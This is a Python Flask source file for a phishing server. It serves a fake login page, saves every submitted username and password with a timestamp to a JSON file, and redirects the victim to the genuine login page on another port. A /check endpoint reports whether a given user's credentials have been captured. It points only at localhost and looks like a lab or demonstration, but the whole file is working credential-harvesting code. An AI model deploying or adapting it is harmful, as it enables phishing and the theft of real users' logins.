from flask import Flask, render_template, request, redirect, url_for, make_response, session, jsonify
import json
from flask_cors import CORS
from datetime import datetime

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "http://localhost:5000"}})
app.secret_key = 'anothersecretkey'

@app.route('/')
def fake_home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Read the existing credentials
        credentials = []
        with open('captured_credentials.json', 'r') as file:
            try:
                credentials = json.load(file)
            except json.JSONDecodeError:
                credentials = []

        # Check if the username already exists
        if any(record['username'] == username for record in credentials):
            return redirect('http://localhost:5000/login')
        
        # Add the new credentials
        credentials.append({
            'username': username,
            'password': password,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })

        # Write the updated credentials back to the file
        with open('captured_credentials.json', 'w') as file:
            json.dump(credentials, file, indent=4)
        
        # Redirect to the original server's login page
        return redirect('http://localhost:5000/login')
  
    return render_template('login_a.html')

@app.route('/check')
def check():
    name = request.args.get('name')
    if not name:
        return jsonify({"error": "Name parameter is missing"}), 400

    try:
        with open('captured_credentials.json', 'r') as file:
            credentials = json.load(file)
        
        for record in credentials:
            if record.get('username') == name:
                return jsonify({"exists": True, "name": name})

        return jsonify({"exists": False, "name": name})
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/home')
def home():
    return "You are logged in to the fake server!"

if __name__ == '__main__':
    app.run(port=5001, debug=True)
